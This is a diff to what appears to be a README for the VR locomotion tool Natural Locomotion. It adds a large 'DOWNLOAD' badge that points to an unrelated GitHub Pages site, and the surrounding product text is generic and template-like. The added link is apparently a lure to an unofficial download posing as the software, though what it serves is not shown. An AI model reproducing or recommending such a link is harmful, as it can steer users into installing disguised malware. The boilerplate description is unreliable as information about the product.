@@ -30,6 +30,12 @@ Natural Locomotion lets you physically walk, run, and jog in place to move in VR
 
 Whether you're a newcomer or a veteran, Natural Locomotion provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Natural Locomotion](https://img.shields.io/badge/⬇_DOWNLOAD_Natural+Locomotion-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
